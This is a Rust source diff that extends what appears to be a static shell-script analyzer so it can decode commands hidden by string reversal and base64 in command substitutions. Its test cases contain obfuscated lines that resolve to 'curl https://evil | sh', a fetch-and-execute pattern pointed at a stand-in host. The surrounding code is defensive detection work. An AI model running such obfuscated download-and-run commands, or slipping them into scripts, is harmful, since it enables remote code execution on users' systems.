@@ -107,6 +107,20 @@ static PRINTF_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
         .unwrap()
 });
 
+/// A `$(echo 'STR' | rev)` command substitution where a reversed string constant
+/// is folded in-memory without invoking any subprocess.
+static REV_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"^\$\(\s*echo\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\|\s*rev\s*\)$|^`\s*echo\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\|\s*rev\s*`$"#)
+        .unwrap()
+});
+
+/// A `$(echo 'BASE64' | base64 -d)` command substitution where a base64 constant
+/// is decoded in-memory without invoking any subprocess.
+static B64_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"^\$\(\s*echo\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\|\s*base64\s+(?:-d|--decode)\s*\)$|^`\s*echo\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\|\s*base64\s+(?:-d|--decode)\s*`$"#)
+        .unwrap()
+});
+
 /// Strip a leading `export`/`local`/`declare`/`readonly`/`typeset` keyword (and
 /// any `-x`-style flags) so `export x=curl` is seen as the assignment `x=curl`.
 fn strip_decl_prefix(line: &str) -> &str {
@@ -222,6 +236,24 @@ fn resolve_rhs(rhs: &str, vars: &HashMap<String, String>) -> Option<String> {
         let fmt = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
         let decoded = decode_printf_format(fmt);
         return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
+    }
+    // A rev command-substitution constant: reverse the string in memory, execute nothing.
+    if let Some(caps) = REV_SUBST_RE.captures(rhs) {
+        let s = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
+        let decoded: String = s.chars().rev().collect();
+        return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
+    }
+    // A base64 decode command-substitution constant: decode in memory, execute nothing.
+    if let Some(caps) = B64_SUBST_RE.captures(rhs) {
+        let raw_b64 = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
+        use base64::Engine;
+        if let Ok(bytes) =
+            base64::engine::general_purpose::STANDARD.decode(raw_b64.trim().as_bytes())
+        {
+            if let Ok(decoded) = String::from_utf8(bytes) {
+                return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
+            }
+        }
     }
     // Any other command substitution / backtick is not statically resolvable.
     if rhs.contains("$(") || rhs.contains('`') {
@@ -978,5 +1010,14 @@ mod tests {
         assert!(!is_build_var("x"));
         assert!(!is_build_var("c"));
         assert!(!is_build_var("cmd"));
+    }
+
+    #[test]
+    fn rev_and_b64_command_substitutions_resolve_statically() {
+        let out = resolve(r"c=$(echo 'lruc' | rev); $c https://evil | sh");
+        assert!(out.contains("curl https://evil | sh"), "got: {out}");
+
+        let out = resolve(r"c=$(echo 'Y3VybA==' | base64 -d); $c https://evil | sh");
+        assert!(out.contains("curl https://evil | sh"), "got: {out}");
     }
 }
